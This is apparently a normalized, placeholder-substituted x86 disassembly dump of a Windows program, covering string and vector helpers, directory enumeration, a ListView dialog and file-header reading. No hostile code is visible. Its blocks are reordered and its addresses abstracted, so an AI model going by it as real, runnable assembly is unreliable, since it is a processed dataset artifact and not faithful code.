mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
cmp [ ebp + 0xc ] ebx
jbe r-xdata
sub_4b28f0
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp esi edi
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
add esi 0x20
cmp esi edi
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi + 0x18 ] 0x10
jb r-xdata
sub_4b2940
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_4b24e0
add esp 0x14
retn 0xc
sub_4b2970
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
push edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push ecx
mov ecx esp
mov [ ecx ] eax
mov ecx esi
call sub_4b25a0
pop edi
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x2
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_4b29e0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_4b2880
mov eax esi
add esp 0x14
shl eax 0x5
add eax edi
pop edi
pop esi
retn 0xc
sub_4b2a10
push ebp
mov ebp esp
push 0xffffffff
push sub_4c2088
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] esp
xor ebx ebx
push 0xffffffff
mov esi ecx
push ebx
push edi
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x34 ] bl
call sub_401dd0
mov eax [ edi + 0x1c ]
mov [ ebp - 0x1c ] eax
mov ecx [ esi + 0x4 ]
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
cmp [ ebp - 0x20 ] 0x10
jb r-xdata
cmp ecx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x34 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_4b2460
mov ebx 0x7ffffff
sub ebx edx
cmp ebx edi
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x5
cmp ecx edi
mov [ ebp - 0x18 ] eax
jae r-xdata
mov edx eax
shr edx 0x1
mov ebx 0x7ffffff
sub ebx edx
cmp ebx eax
jae r-xdata
add edx edi
cmp eax edx
jae r-xdata
push eax
push ecx
mov ecx esp
shl edi 0x5
mov edx edi
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov edi eax
mov ecx esp
sub edi edx
mov [ ecx ] edi
mov ecx esi
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x10 ] edx
call sub_4b2940
push ecx
mov ecx [ ebp - 0x18 ]
mov [ esi + 0x8 ] eax
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] ecx
mov [ ebp + 0x8 ] esp
mov eax esp
push ecx
mov [ eax ] edi
mov eax esp
lea edx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push edx
mov [ eax ] ebx
call sub_4b2840
add esp 0x10
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
add ecx ebx
mov [ eax ] ecx
mov ecx edi
shl ecx 0x5
mov [ ebp + 0x10 ] ecx
add ecx ebx
push ecx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] ebx
call sub_4b2940
mov eax [ esi + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x5
lea edx [ ebp - 0x38 ]
push edx
sub edi ecx
push edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_4b29e0
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x38 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add eax edx
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0x8 ] esp
call sub_448610
add esp 0xc
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x5
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
shl eax 0x5
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] eax
call sub_4b24e0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x38 ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_4b2880
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x14
push edx
mov eax edi
shl eax 0x5
add ecx eax
mov eax [ esi + 0x8 ]
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_4b24e0
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edx edi
cmp eax edx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x5
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
add ecx ebx
shl edi 0x5
add edi ebx
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
jmp r-xdata
mov edx [ esi + 0x8 ]
push edx
push ecx
mov ecx esi
call sub_448e00
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
add edi eax
test ecx ecx
je r-xdata
add eax edi
sub_4b2d10
push 0xffffffff
push sub_4c20a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov ecx rw-data
mov [ esp + 0x8 ] rw-data
call sub_404310
mov esi [ rw-data ]
mov eax [ rw-data ]
xor ebx ebx
cmp esi eax
mov [ esp + 0x14 ] ebx
mov [ rw-data ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ esi ]
cmp ecx ebx
je r-xdata
mov ecx rw-data
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_401420
mov ecx [ esp + 0xc ]
pop esi
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ rw-data ]
sub_4b2db0
push 0xffffffff
push sub_4c20fa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3bc
mov edx [ esp + 0x3cc ]
push ebx
push ebp
push esi
push edi
xor edi edi
mov eax edx
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] edi
mov [ esp + 0x1c ] 0x0
lea esi [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x20 ]
call sub_401e80
mov eax [ esp + 0x30 ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x1c ]
mov [ esp + 0x3d4 ] edi
jae r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x1c ]
mov eax r--data
lea edx [ eax + 0x1 ]
push 0x5c
push 0x1
lea ecx [ esp + 0x20 ]
call sub_4017f0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x20 ]
call sub_401cc0
cmp [ esp + 0x30 ] ebp
mov eax [ esp + 0x1c ]
jae r-xdata
lea ecx [ esp + 0x8c ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
mov ecx [ esp + 0x2c ]
mov ebx eax
lea eax [ ecx - 0x5 ]
cmp eax ecx
mov [ esp + 0x14 ] ebx
ja r-xdata
lea eax [ esp + 0x1c ]
sub eax ecx
push edi
push eax
lea ecx [ esp + 0x20 ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0x20 ]
call sub_401ba0
jmp r-xdata
mov esi [ lstrcmpA@IAT ]
push r--data
lea eax [ esp + 0xbc ]
push eax
call esi
test eax eax
je r-xdata
cmp [ esp + 0x30 ] ebp
jb r-xdata
cmp ebx 0xffffffff
jne r-xdata
lea ecx [ esp + 0x8c ]
push ecx
push ebx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
lea ecx [ esp + 0xbc ]
push ecx
call esi
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push ebx
call [ FindClose@IAT ]
cmp [ esp + 0x30 ] ebp
jb r-xdata
lea edx [ esp + 0xb8 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_402140
add esp 0xc
test [ esp + 0x8c ] 0x10
mov [ esp + 0x3d4 ] 0x1
je r-xdata
mov ecx [ esp + 0x3cc ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x3c8
retn
xor eax eax
mov edx [ esp + 0x1c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ rw-data ]
cmp esi [ rw-data ]
je r-xdata
cmp [ esp + 0x4c ] ebp
mov eax [ esp + 0x38 ]
jae r-xdata
push 0x4c
call sub_4b573e
mov esi eax
add esp 0x4
mov [ esp + 0x10 ] esi
cmp esi edi
mov [ esp + 0x3d4 ] 0x3
je r-xdata
mov ecx [ esi ]
lea edx [ esp + 0x70 ]
call sub_4b2260
cmp [ eax + 0x18 ] ebp
mov ecx [ eax + 0x14 ]
mov [ esp + 0x3d4 ] 0x2
jb r-xdata
push eax
call sub_4b2db0
add esp 0x4
jmp r-xdata
lea eax [ esp + 0x38 ]
xor esi esi
mov ecx esi
call sub_4b2290
mov [ esi ] r--data
mov [ esi + 0x24 ] edi
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ esp + 0x4c ] ebp
mov [ esp + 0x3d4 ] 0x0
jb r-xdata
cmp [ esp + 0x4c ] ebp
mov eax [ esp + 0x38 ]
jae r-xdata
cmp esi edi
mov [ esp + 0x3d4 ] 0x1
mov [ esp + 0x10 ] esi
je r-xdata
test bl bl
mov eax [ rw-data ]
mov [ esp + 0x88 ] 0xf
mov [ esp + 0x84 ] edi
mov [ esp + 0x74 ] 0x0
jne r-xdata
mov eax [ esp + 0x74 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x48 ]
push ecx
push eax
push edx
push edi
lea ecx [ esp + 0x44 ]
call sub_401150
mov ebx eax
mov eax [ esp + 0x88 ]
neg ebx
sbb bl bl
inc bl
cmp eax ebp
mov [ esp + 0x3d4 ] 0x1
jb r-xdata
mov ebx [ esp + 0x14 ]
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] edi
mov [ esp + 0x38 ] 0x0
mov eax [ esp + 0x38 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push eax
mov ecx esi
call sub_4b2300
test eax eax
je r-xdata
lea eax [ esp + 0x38 ]
cmp esi eax
jne r-xdata
add esi 0x4
cmp esi eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
mov ecx rw-data
call sub_4b2970
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] edi
mov [ esp + 0x54 ] 0x0
mov ebp [ esp + 0x10 ]
push 0x200
lea ecx [ esp + 0x1d0 ]
push ecx
mov ebx 0x2
push ebx
mov [ esp + 0x3e0 ] 0x4
mov [ esp + 0x78 ] ebp
call [ ebp + 0x28 ]
test eax eax
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0x4 ]
jmp r-xdata
jmp r-xdata
cmp [ esp + 0x68 ] 0x10
jb r-xdata
lea esp [ esp ]
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] edi
mov [ esp + 0x54 ] 0x0
mov ebp 0x10
mov edx [ esp + 0x54 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
test ecx ecx
je r-xdata
cmp al 0x20
je r-xdata
mov al [ edi ]
test al al
je r-xdata
mov edx edi
sub edx ecx
push edx
push ecx
lea ecx [ esp + 0x58 ]
call sub_401e80
mov esi [ rw-data ]
test esi esi
mov edx [ rw-data ]
je r-xdata
cmp al 0x3b
jne r-xdata
push 0x200
lea ecx [ esp + 0x1d0 ]
push ecx
add ebx 0x2
push ebx
call [ ebp + 0x28 ]
test eax eax
jne r-xdata
xor ecx ecx
lea eax [ esp + 0x50 ]
push eax
push 0x1
push ecx
mov eax esp
mov ecx rw-data
mov [ eax ] edx
call sub_4b2a10
mov ecx [ rw-data ]
mov eax edx
sub eax esi
sub ecx esi
sar eax 0x5
sar ecx 0x5
cmp eax ecx
jae r-xdata
cmp al 0x2e
jne r-xdata
mov [ esp + 0x3cb ] 0x0
lea edi [ esp + 0x1cc ]
xor ecx ecx
xor edi edi
inc edi
jmp r-xdata
mov ecx edi
mov eax [ esp + 0x14 ]
push eax
push rw-data
lea ecx [ esp + 0x58 ]
push ecx
push 0x1
push edx
mov esi edx
call sub_4b2880
add esp 0x14
add esi 0x20
mov [ rw-data ] esi
jmp r-xdata
mov al [ edi ]
test al al
je r-xdata
sub_4b3220
push 0xffffffff
push sub_4c211b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x108
push esi
mov ecx rw-data
mov [ esp + 0x4 ] rw-data
call sub_404310
push 0x104
push rw-data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x120 ] 0x0
mov [ rw-data ] 0x1
call [ lstrcpynA@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
call sub_458050
lea edx [ esp + 0xc ]
push edx
call sub_4b2db0
add esp 0x8
mov ecx rw-data
mov esi eax
call sub_401420
mov ecx [ esp + 0x10c ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x114
retn
sub_4b32b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c2151
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x284
cmp eax 0x111
push ebx
push ebp
push esi
push edi
ja r-xdata
cmp eax 0x1401
jne r-xdata
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ esp + 0x2a4 ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x4ee
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push 0xbbd
push esi
call edi
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
mov ebx eax
push 0x1009
push ebx
call ebp
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
movzx eax [ esp + 0x2ac ]
cmp eax 0x4ed
jg r-xdata
cmp eax 0x4e
je r-xdata
mov ecx [ esp + 0x294 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x290
retn 0x10
mov eax 0x1
jmp r-xdata
cmp eax 0x4ee
jne r-xdata
je r-xdata
cmp [ esp + 0x2ac ] 0xbbd
jne r-xdata
cmp eax 0x110
jne r-xdata
xor eax eax
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] al
mov ecx [ edi ]
lea edx [ esp + 0x78 ]
mov [ esp + 0x29c ] eax
call sub_4b2260
mov esi eax
mov ecx [ edi ]
lea edx [ esp + 0x5c ]
mov [ esp + 0x29c ] 0x1
call sub_4b2260
cmp [ esi + 0x18 ] 0x10
mov [ esp + 0x29c ] 0x2
jb r-xdata
mov ecx [ esp + 0x2a4 ]
push 0xbbd
push ecx
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
mov edi eax
push 0x1004
push edi
call ebp
mov ebx eax
xor esi esi
test ebx ebx
jle r-xdata
call sub_4b3220
mov eax [ esp + 0x2a4 ]
push 0x0
push 0x0
push 0x1401
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x2b0 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0xffffff9b
jne r-xdata
mov ebp [ esp + 0x2a4 ]
push 0xbbd
push ebp
call [ GetDlgItem@IAT ]
mov edi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push ebx
mov esi eax
push 0x1037
push esi
call edi
or eax 0x21
push eax
push ebx
push 0x1036
push esi
call edi
lea eax [ esp + 0x10 ]
push eax
push ebx
push 0x101b
push esi
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] 0x64
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] ebx
call edi
lea ecx [ esp + 0x10 ]
push ecx
push 0x1
push 0x101b
push esi
mov [ esp + 0x28 ] 0x50
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] 0x1
call edi
lea edx [ esp + 0x10 ]
push edx
push 0x2
push 0x101b
push esi
mov [ esp + 0x28 ] 0x50
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] 0x2
call edi
lea eax [ esp + 0x10 ]
push eax
push 0x3
push 0x101b
push esi
mov [ esp + 0x28 ] 0x96
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] 0x3
call edi
push ebx
push ebx
push 0x1401
push ebp
call edi
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push 0x2
push esi
push 0x102c
push edi
call ebp
test eax eax
jne r-xdata
mov edx [ esp + 0x2a4 ]
push 0x1
push edx
call [ EndDialog@IAT ]
jmp r-xdata
dec eax
jne r-xdata
cmp ecx 0xfffffffd
jne r-xdata
mov ecx [ eax + 0xc ]
xor esi esi
test ecx ecx
jl r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
test esi esi
jl r-xdata
inc esi
cmp esi ebx
jl r-xdata
mov ecx [ esp + 0x2a4 ]
push 0x2
push ecx
call [ EndDialog@IAT ]
jmp r-xdata
mov eax [ esp + 0x2a4 ]
push 0x0
push 0x4ee
push 0x111
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov edx [ esp + 0x2a4 ]
push esi
push 0x4ee
push edx
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
jmp r-xdata
mov edx [ rw-data ]
test edx edx
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x18 ]
call sub_401e80
cmp [ esp + 0x74 ] 0x10
jb r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
lea ecx [ ecx ]
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esp + 0x90 ]
mov esi 0x10
cmp eax esi
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x29c ] 0x0
jb r-xdata
mov edx [ esp + 0x60 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ edx + ecx * 4 ]
mov eax [ ecx + 0x2c ]
test eax eax
je r-xdata
cmp ecx eax
jge r-xdata
cmp [ esp + 0x28 ] esi
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] 0x0
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x30 ] 0x1
jb r-xdata
mov eax [ esp + 0x7c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ ecx + esi * 4 ]
mov eax [ edx + 0x2c ]
test eax eax
je r-xdata
cmp esi eax
jge r-xdata
mov esi 0x1
lea edx [ esp + 0x14 ]
mov [ esp + 0x44 ] edx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x44 ] ecx
jmp r-xdata
mov ecx [ esp + 0x2a4 ]
push 0x1
push ecx
call eax
jmp r-xdata
mov edx [ esp + 0x28 ]
add ecx edx
mov [ eax ] ecx
push ecx
cmp [ esp + 0x30 ] esi
mov ecx [ esp + 0x1c ]
mov eax esp
jae r-xdata
lea ecx [ esp + 0x18 ]
push 0x0
push 0x0
push 0x1004
push ebx
call ebp
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x30 ]
push eax
push 0x0
push 0x1007
push ebx
mov [ esp + 0x48 ] 0x0
call ebp
push ecx
cmp [ esp + 0x2c ] esi
mov ecx [ esp + 0x18 ]
mov eax esp
jae r-xdata
mov [ eax ] ecx
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x1c ]
call sub_401c60
mov ecx [ edi ]
push 0x200
lea edx [ esp + 0x98 ]
push edx
mov esi 0x2
push esi
call [ ecx + 0x28 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x1c ]
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x30 ] 0x1
jb r-xdata
lea ebx [ ebx ]
lea ecx [ esp + 0x14 ]
mov [ esp + 0x44 ] ecx
mov eax [ esp + 0x14 ]
mov [ esp + 0x44 ] eax
jmp r-xdata
lea eax [ esp + 0x94 ]
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x24 ]
add ecx edx
cmp eax 0x10
mov edx esi
jae r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x30 ]
push edx
push 0x0
push 0x1006
push ebx
mov [ esp + 0x48 ] 0x1
call ebp
mov eax [ esp + 0x28 ]
cmp eax 0x10
mov esi [ esp + 0x14 ]
mov ecx esi
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x98 ]
push eax
lea ecx [ esp + 0x18 ]
call sub_401cc0
mov ecx [ edi ]
push 0x200
lea edx [ esp + 0x98 ]
push edx
add esi 0x2
push esi
call [ ecx + 0x28 ]
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401cc0
test edx edx
jne r-xdata
lea edx [ esp + 0x14 ]
lea esi [ esp + 0x14 ]
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov eax edx
sub eax esi
xor eax eax
jmp r-xdata
push ecx
push eax
lea ecx [ esp + 0x18 ]
call sub_401ba0
mov eax [ edi ]
push 0x200
lea ecx [ esp + 0x98 ]
push ecx
mov esi 0x3
push esi
mov [ esp + 0xa0 ] 0x0
call [ eax + 0x28 ]
test eax eax
je r-xdata
sub ecx edx
test ecx ecx
je r-xdata
cmp [ esp + 0x28 ] 0x10
mov esi 0x1
mov [ esp + 0x30 ] esi
jb r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
mov [ esp + 0x44 ] eax
mov edx [ esp + 0x14 ]
mov [ esp + 0x44 ] edx
jmp r-xdata
lea eax [ esp + 0x94 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ rw-data ]
add edi 0x4
cmp edi eax
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x30 ]
push ecx
push 0x0
push 0x1006
push ebx
mov [ esp + 0x48 ] 0x2
call ebp
mov edx [ edi ]
push 0x200
lea eax [ esp + 0x98 ]
push eax
push esi
mov [ esp + 0xa0 ] 0x0
call [ edx + 0x28 ]
lea edx [ esp + 0x30 ]
push edx
push 0x0
push 0x1006
lea ecx [ esp + 0xa0 ]
push ebx
mov [ esp + 0x40 ] esi
mov [ esp + 0x54 ] ecx
mov [ esp + 0x48 ] 0x3
call ebp
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x29c ] 0xffffffff
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x98 ]
push edx
lea ecx [ esp + 0x18 ]
call sub_401cc0
mov eax [ edi ]
push 0x200
lea ecx [ esp + 0x98 ]
push ecx
add esi 0x2
push esi
mov [ esp + 0xa0 ] 0x0
call [ eax + 0x28 ]
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401cc0
sub_4b39d0
push 0xffffffff
push sub_4c20a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
mov al [ rw-data ]
test al al
mov [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x14 ]
push esi
push 0x0
push sub_4b32b0
push eax
push 0x172
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
mov ecx rw-data
mov esi eax
call sub_401420
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
call sub_4b3220
sub_4b3a50
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x120c
call sub_4b6180
mov eax [ ebp + 0xc ]
test eax eax
push ebx
push esi
push edi
mov [ esp + 0x14 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov edi eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push esi
call [ CreateFileA@IAT ]
mov edx eax
xor eax eax
cmp edx 0xffffffff
mov [ esp + 0x14 ] edx
je r-xdata
mov ebx [ esp + 0x10 ]
push 0x200
push eax
lea eax [ esp + 0x20 ]
push eax
call [ lstrcpynA@IAT ]
lea ebx [ esp + 0x18 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
mov ecx 0x400
lea edi [ esp + 0x21c ]
[ edi ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x800
lea eax [ esp + 0x224 ]
push eax
push edx
call [ ReadFile@IAT ]
push 0x200
push esi
lea ecx [ esp + 0x20 ]
push ecx
lea edi [ esp + 0x224 ]
call [ lstrcpynA@IAT ]
lea ebx [ esp + 0x18 ]
jmp r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
mov [ esp + 0x10 ] 0x0
je r-xdata
call sub_4b3220
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
lea esp [ esp ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jne r-xdata
push edi
push ebx
call [ eax + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi ]
test [ eax + 0x24 ] 0x2
je r-xdata
jmp r-xdata
mov edx [ esi ]
mov [ esp + 0x10 ] edx
sub_4b3b90
mov al [ rw-data ]
test al al
jne r-xdata
